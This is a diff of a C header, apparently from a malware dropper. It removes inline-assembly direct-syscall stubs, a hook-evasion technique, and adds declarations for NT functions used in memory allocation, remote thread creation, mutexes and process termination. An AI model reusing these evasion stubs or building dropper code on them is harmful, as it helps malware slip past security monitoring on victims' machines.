@@ -1,69 +1,91 @@
 #ifndef __DROPPER_NTAPI_H
 #define __DROPPER_NTAPI_H
 
-/*
-    DEPRECATED
-*/
-
 #define NTAPISTUB     \
     DECLSPEC_NAKED    \
     DECLSPEC_NOINLINE \
     NTAPI
 
-#if SCFG_NTAPI_INIT_USE_PROCLOAD == ON
-    #define NTAPI_STUB_SOURCE(FUNCTION, ARGSIZE) \
-        {                                        \
-            __asm { jmp dword ptr FUNCTION };    \
-        }
-#else
-    #define NTAPI_STUB_SOURCE(FUNCTION, ARGSIZE)                            \
-        {                                                                   \
-            __asm { test byte ptr [Config.NtVersion.bIsDeprecated], TRUE }; \
-            __asm { jz L1                                                }; \
-            __asm { jmp dword ptr FUNCTION                               }; \
-        L1:                                                                 \
-            __asm { mov edx, offset KiFastSystemCall                     }; \
-            __asm { mov eax, dword ptr FUNCTION                          }; \
-            __asm { test byte ptr [Config.Cpu.bUnderWow64], TRUE         }; \
-            __asm { cmovnz edx, dword ptr [Config.Os.dwWow64CallOffset]  }; \
-            __asm { call edx                                             }; \
-            __asm { ret ARGSIZE                                          }; \
-        }
-#endif
-
-BOOL
-DECLSPEC_DEPRECATED
-NtapiFindInMemory(VOID);
-
-ULONG
-DECLSPEC_DEPRECATED
-NtapiImportAddressMethod(
-    IN  ULONG  cbFucntionCount,
-    OUT PVOID  pAddressExport,
-    IN  PDWORD dwProcNamesHash
+NTSTATUS
+NTAPISTUB
+NtAllocateVirtualMemory(
+    IN HPROCESS  ProcessHandle,
+    IO PVOID    *BaseAddress,
+    IN ULONG_PTR ZeroBits,
+    IO PSIZE_T   RegionSize,
+    IN ULONG     AllocationType,
+    IN ULONG     Protect
     );
 
-static
-VOID
-FORCEINLINE
-DECLSPEC_DEPRECATED
-NtapiImportSyscallMethod(
-    IN  ULONG  cbFucntionCount,
-    OUT PVOID  pAddressExport,
-    IN  PULONG pSycallOffsets
-    )
-{
-    $DLOG0(DLG_FLT_INFO,    "Importing %lu functions");
-    $DLOG1(DLG_FLT_DEFAULT, "pAddressExport = 0x%p", pAddressExport);
-    $DLOG1(DLG_FLT_DEFAULT, "pSycallOffsets = 0x%p", pSycallOffsets);
+NTSTATUS
+NTAPISTUB
+NtFreeVirtualMemory(
+    IN HPROCESS ProcessHandle,
+    IN PVOID   *BaseAddress,
+    IO PSIZE_T  RegionSize,
+    IN ULONG    FreeType
+    );
 
-    PRAGMA_LOOP_UNROLL_N(16)
-    for (ULONG_PTR i = 0; i != cbFucntionCount; i++) {
-        ((PULONG_PTR)pAddressExport)[i] = pSycallOffsets[i];
-        $DLOG1(DLG_FLT_DEFAULT, "0x%p = %08lX", &((PULONG_PTR)pAddressExport)[i], pSycallOffsets[i]);
-    }
+NTSTATUS
+NTAPISTUB
+NtCreateThreadEx(
+    OUT PHTRHEAD    hThread,
+    IN  ACCESS_MASK DesiredAccess,
+    IN  PVOID       ObjectAttributes,
+    IN  HPROCESS    ProcessHandle,
+    IN  PTHREAD_START_ROUTINE pStartAddress,
+    IN  PVOID       pParameter,
+    IN  BOOL        CreateSuspended,
+    IN  ULONG       StackZeroBits,
+    IN  ULONG       SizeOfStackCommit,
+    IN  ULONG       SizeOfStackReserve,
+    OUT PVOID       pBytesBuffer
+    );
 
-    $DLOG1(DLG_FLT_INFO, "Done!");
-}
+NTSTATUS
+NTAPISTUB
+NtCreateFile(
+    OUT PHANDLE            FileHandle,
+    IN  ACCESS_MASK        DesiredAccess,
+    IN  POBJECT_ATTRIBUTES ObjectAttributes,
+    OUT PIO_STATUS_BLOCK   IoStatusBlock,
+    IN  PLARGE_INTEGER     AllocationSize,
+    IN  ULONG              FileAttributes,
+    IN  ULONG              ShareAccess,
+    IN  ULONG              CreateDisposition,
+    IN  ULONG              CreateOptions,
+    IN  PVOID              EaBuffer,
+    IN  ULONG              EaLength
+    );
+
+NTSTATUS
+NTAPISTUB
+NtClose(
+    IN HANDLE Handle
+    );
+
+NTSTATUS
+NTAPISTUB
+NtCreateMutant(
+    OUT     PHANDLE             MutantHandle,
+    IN      ACCESS_MASK         DesiredAccess,
+    IN  OPT POBJECT_ATTRIBUTES  ObjectAttributes,
+    IN      BOOLEAN             InitialOwner
+    );
+
+NTSTATUS
+NTAPISTUB
+NtOpenMutant(
+    OUT PHANDLE            MutantHandle,
+    IN  ACCESS_MASK        DesiredAccess,
+    IN  POBJECT_ATTRIBUTES ObjectAttributes
+    );
+
+NTSTATUS
+NTAPISTUB
+NtTerminateProcess(
+    IN OPT HANDLE   ProcessHandle,
+    IN     NTSTATUS ExitStatus
+    );
 
 #endif
